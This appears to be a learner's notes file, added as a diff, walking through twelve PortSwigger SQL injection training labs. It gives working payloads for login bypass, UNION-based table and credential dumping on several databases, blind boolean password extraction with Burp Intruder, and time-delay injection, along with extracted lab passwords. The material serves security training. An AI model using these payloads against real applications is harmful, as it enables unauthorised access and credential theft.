@@ -1,0 +1,214 @@
+Task 1:
+///Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data:///
+
+https://0ab300fa04e65f928541314a00810085.web-security-academy.net/filter?category=Accessories%27+OR+1=1--
+
+Task 2:
+///Lab: SQL injection vulnerability allowing login bypass///
+
+Login with the credentials:
+Username: administrator' OR '1'='1     ///in the solution its administrator'--
+password: anything
+
+Task 3:
+///Lab: SQL injection attack, querying the database type and version on Oracle///
+
+MY first try was:
+https://0a2f00a1036a2d8780883fd60004005c.web-security-academy.net/filter?category=Gifts%27-- And sql inj is working...
+Under the hint the task says:
+"There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual".
+So lets try this:
+https://0a2f00a1036a2d8780883fd60004005c.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27+FROM+dual--
+And we got an internal error...maybe there is more than 1 columns...:
+https://0a2f00a1036a2d8780883fd60004005c.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual-- ///And this works.
+So our job is to find out the version.
+In the cheat-sheet there is 2 options for this : SELECT banner FROM v$version and SELECT version FROM v$instance
+Since we have 2 columns, let see if SELECT version, null FROM v$instance-- works...internal error...lets see the other one:
+SELECT banner, null FROM v$version-- And it worked.
+
+Task 4:
+///Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft///
+
+We need version again, but this time its not oracle, its mysql. In cheat-sheet for my sql its: SELECT @@version, so my first try:
+https://0a2200cd0356890a806ac190009400f9.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+@@version--  //Internal server error...Hm lets see with:, null...
+https://0a2200cd0356890a806ac190009400f9.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+@@version,+NULL-- and its still internal error...and in the cheat sheet, there is a microsoft comment part where i see that # maybe will works...
+https://0a2200cd0356890a806ac190009400f9.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+@@version,+NULL# And its worked!!
+
+Task 5:
+///SQL injection attack, listing the database contents on non-Oracle databases///
+
+So we know that the database is a non-oracle, we can use union attacks and we need the administrator's password.
+Lets find out how many columns are there...:
+I predict two, so :https://0ad8007a045d9bc6808c08f1004500e6.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,+%27def%27-- and its working...so...we have to see the list of the tables somehow...
+We have a line for this in the cheat-sheet: SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+BUT we have to modify this to win the table names from the database... SELECT table_name, NULL FROM information_schema.columns...THE url:
+https://0ad8007a045d9bc6808c08f1004500e6.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns--
+And the webpage shows us all the tables...There is 2 tables which indicates, that maybe contains usernames...This 2 is users_kuuknr and pg_user
+So we have to win infromation from these. Lets see the first one
+Again we will use this:  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' but modify it again like this: SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_kuuknr'
+And in the comments these new lines popped up:
+password_oicbvq
+username_tlfzgr
+This is 2 new column name which is from the table users_kuuknr. So this will contains the usernames and password, all we have to do is win out these...
+We will use the SELECT * FROM information_schema.tables form, but like this: SELECT username_tlfzgr, password_oicbvq FROM users_kuuknr
+https://0ad8007a045d9bc6808c08f1004500e6.web-security-academy.net/filter?category=Gifts%27UNION+SELECT+username_tlfzgr,+password_oicbvq+FROM+users_kuuknr--
+And here are the users and passwords...
+carlos
+0814qcqfsn92c1wk77za
+administrator
+i5ud38l0oh4qiafk36i4
+wiener
+lauxwgdeb9wt6uv5k07t
+So lets log in with admin, and we solved the lab.
+
+Task 6:
+///Lab: SQL injection attack, listing the database contents on Oracle///
+
+So we have to do the same like in task 5, but this time its an oracle...
+In the hint there is a line: UNION SELECT 'abc' FROM dual, so lets see this first...but with 2 columns. because there was always 2 columns before...
+https://0aa300b1038f2db280be4463000a0074.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,+%27def%27+FROM+dual--
+OKay its working. Next move is to win table names again...We will use:SELECT * FROM all_tables but instead of * we will write table_name and NULL...
+https://0aa300b1038f2db280be4463000a0074.web-security-academy.net/filter?category=Gifts%%27+UNION+SELECT+table_name,+NULL+FROM+all_tables--
+Now we have: USERS_XIMQIQ table. Lets win out the column names from this table...:
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' but with the following form: SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_XIMQIQ':
+https://0aa300b1038f2db280be4463000a0074.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name+=+%27USERS_XIMQIQ%27--
+Two new line popped up:
+PASSWORD_TDCSMC
+USERNAME_QFQGDE
+SELECT * FROM all_tables ---> SELECT USERNAME_QFQGDE, PASSWORD_TDCSMC FROM USERS_XIMQIQ:
+administrator
+g8rwr7fyyt2dthg08na2
+carlos
+lqnff7xqm0ud0zs53bqm
+wiener
+rkhrjfchxi3yvia5l6w6
+And log in as admin...
+
+Task 7:
+///Lab: SQL injection UNION attack, determining the number of columns returned by the query///
+
+https://0a57009a03735f2180e121fc00650036.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL-- >>Internal server error
+https://0a57009a03735f2180e121fc00650036.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+NULL--  >>internal server error
+https://0a57009a03735f2180e121fc00650036.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+NULL,+NULL-- >>solving the lab...
+
+Task 8:
+///Lab: SQL injection UNION attack, finding a column containing text///
+
+"You can do this using a technique you learned in a previous lab."...SO:
+https://0ade00ae0484ed0f80c73ab9008600af.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,+NULL,+NULL-- >>worked...
+"The next step is to identify a column that is compatible with string data." So lets try insted of the 'NULL, NULL, NULL' like 'asd', NULL, NULL...and if its not working: NULL, 'asd', NULL...etc..lets see which one will work...:
+https://0ade00ae0484ed0f80c73ab9008600af.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,+%27asd%27,+NULL-- >>>worked...
+To solve the task: At the top of the page there is a line something like: "Make database....: strings" so instead of asd copy these strings into the payload:
+https://0ade00ae0484ed0f80c73ab9008600af.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,+%278pDRPk%27,+NULL--
+
+Task 9:
+///Lab: SQL injection UNION attack, retrieving data from other tables///
+
+https://0a3b008003d9237080102b1200ab0056.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+NULL,+NULL-- >>>worked
+https://0a3b008003d9237080102b1200ab0056.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+%27asd%27,+%27def%27-- >>>both are text
+"The database contains a different table called users, with columns called username and password."
+So letch check: SELECT * FROM all_tables, but with SELECT username, password FROM users.
+https://0a3b008003d9237080102b1200ab0056.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+username,+password+FROM+users-- >>>
+carlos
+qxyqzh3dsjjbj2b6eo6a
+wiener
+g4kbizes0o07ndv76z1w
+administrator
+h1tf3jxtpbwxmeb7z3x7
+Log in as admin to solve the lab...
+
+Task 10:
+///Lab: SQL injection UNION attack, retrieving multiple values in a single column///
+
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+NULL-- >>worked
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27asd%27,+NULL-- >>not worked
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+%27asd%27-- >>worked
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27123%27,+%27asd%27-- >>worked
+"The database contains a different table called users, with columns called username and password"
+So since the first column is a number (probably an id or something like that) the second one will be the usernames, and the passwords will be in another table...
+With this we can check if im right: SELECT NULL, username FROM user:
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+username+FROM+users-- >>worked, administrator, carlos and wiener popped up...
+To move the password here we will use the following injection: 'foo'||'bar'
+SELECT NULL, username||password FROM users:
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+username||password+FROM+users--
+And these lines popped up:
+carloswajy5xjawtkzoukxqr7g
+wiener2u1fal6ghzmubq5wr1mj
+administratorl36uwr06o0acvb1k5byc
+If we want, we can separate them:
+https://0a6200e3035e3ebb8031c7a200130056.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,+username||%27%20%27||password+FROM+users--
+And it will change the output like:
+
+wiener 2u1fal6ghzmubq5wr1mj
+carlos wajy5xjawtkzoukxqr7g
+administrator l36uwr06o0acvb1k5byc
+Log in as administrator to solve the lab...
+
+Task 11:
+///Lab: Blind SQL injection with conditional responses///
+
+"the application includes a Welcome back message in the page if the query returns any rows." This means the webapp using a tracking ID or something like that, so we have to use burpsuite to solve this...
+GET /academyLabHeader HTTP/2
+Host: 0adf00910403edde80d949b600130053.web-security-academy.net
+Connection: Upgrade
+Pragma: no-cache
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Upgrade: websocket
+Origin: https://0adf00910403edde80d949b600130053.web-security-academy.net
+Sec-Websocket-Version: 13
+Accept-Encoding: gzip, deflate, br
+Accept-Language: hu-HU,hu;q=0.9
+Cookie: TrackingId=xlI6B96WIKSgh6Mx; session=UZ3AFmVwjKCVFQKRZ4tGac9X0zZLuUzY
+Sec-Websocket-Key: STufO1tQ7xW0uI4D6hTqXA==
+
+And yes...there is the tracking id. So the webapp saves our id and give back a message when we come back again. Which means this part of the webapp must use the database, so probably we can use this tracking id to inject our sql code. Lets check it.
+Intercept the request and change the id:
+TrackingId=xlI6B96WIKSgh6Mx' OR '1'='1; >>> And it worked, we got a welcome back message! So we have a blind sql vulnerability...
+"The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user."
+There is a method we can use to win out the adminstrator's password 1 by 1...
+First lets see if there is a users table...
+GET / HTTP/2
+Host: 0adf00910403edde80d949b600130053.web-security-academy.net
+Cookie: TrackingId=xlI6B96WIKSgh6Mx' AND (SELECT 'a' FROM users LIMIT 1)='a; session=UZ3AFmVwjKCVFQKRZ4tGac9X0zZLuUzY
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: hu-HU,hu;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+We got a welcome back message, so the table exists.
+Next move is to check is there an administrator in it or not...:
+Cookie: TrackingId=xlI6B96WIKSgh6Mx' AND (SELECT 'a' FROM users WHERE username='administrator')='a;
+We got a welcome back again, so it exists.
+The next move is to figure out the password for the administrator. To do this we need burpsuits intruder.
+So refresh the page and send the GET request to the intruder.
+Change the cookie part like this:
+Cookie: TrackingId=xlI6B96WIKSgh6Mx' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a; session=UZ3AFmVwjKCVFQKRZ4tGac9X0zZLuUzY
+This means it picks the first letter from the password of the administrator and checks if it is the 'a' letter...
+So add a payload position marker to the 'a' like this:
+WHERE username='administrator')='§a§
+In the payload configurations you can add all letters (lowercase, uppercase), and numbers one-by-one.
+Next option we have to set is in the payload's settings menu/Grep-match part...clear the list and add: Welcome back! 
+That the result what we get, when we have a match, and run the attack.
+In my case my first letter in the password is 'r'
+To find out the 2nd letter change the SUBSTRING(password,1,1) part to SUBSTRING(password,2,1) and run the attack again. And keep following this method, until there will be no match in the welcome back part.
+So my password is:
+rodz8ixn9vdaau13x65r  >>>and thats it at SUBSTRING(password,21,1) i didn't got any welcome back response...all we have to do is login with administrator with this password.
+
+Task 12:
+///Lab: Blind SQL injection with time delays///
+"The application uses a tracking cookie for analytics" + "since the query is executed synchronously, it is possible to trigger conditional time delays to infer information."
+So to solve the lab with Burpsuite intercept the GET request, and change the tracking id:
+GET / HTTP/2
+Host: 0adc00980308bb8e80dbd07700d50039.web-security-academy.net
+Cookie: TrackingId=ShelxXm3FLhe3Znx'||pg_sleep(10)--; session=zq90QvOi9FKjYtOBH8MY1floCIhSoSle
+
